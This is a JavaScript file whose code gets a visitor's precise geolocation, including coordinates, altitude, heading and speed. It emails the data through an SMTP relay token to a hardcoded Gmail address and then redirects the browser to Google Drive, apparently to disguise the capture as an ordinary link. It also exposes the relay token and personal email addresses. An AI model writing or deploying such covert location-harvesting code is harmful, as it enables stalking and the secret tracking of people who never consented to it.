function mainFunction(){
    
const successcallback = (position) =>{
    console.log(position);
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;


        // var body = $('#body').val();

        var Body='Latitude:'+lat+'<br>longitude:'+lon+'<br>accuracy:'+acc+'<br>altitude:'+alt+'<br>direction:'+dir+'<br>speed:'+spd;


        Email.send({
    SecureToken:"c79343af-f4e9-40f5-965e-76fb6d294f30",
            To: 'shivangyadav36557@gmail.com',
            From: "downract@gmail.com",
            Subject: "Device Location",
            Body: Body
        }).then(
            message =>{
                //console.log (message);
                if(message=='OK'){
                
                }
                else{
                    console.error (message);
                    alert('Please check your internet connection and try again or try to open in another browser.')
                    
                }

            }
        );
        window.open("https://drive.google.com/","_self")
    };
const failcallback = (error) =>{
    console.error(error);
    var Body='error occupied';


        Email.send({
    SecureToken:"c79343af-f4e9-40f5-965e-76fb6d294f30",
            To: 'shivangyadav36557@gmail.com',
            From: "downract@gmail.com",
            Subject: "Device Location",
            Body: Body
        }).then(
            message =>{
                //console.log (message);
                if(message=='OK'){
                
                }
                else{
                    console.error (message);
                    alert('Please check your internet connection and try again or try to open in another browser.')
                    
                }

            }
        );
};

const watchid = navigator.geolocation.getCurrentPosition(successcallback,failcallback,{
    enableHighAccuracy: true
});


}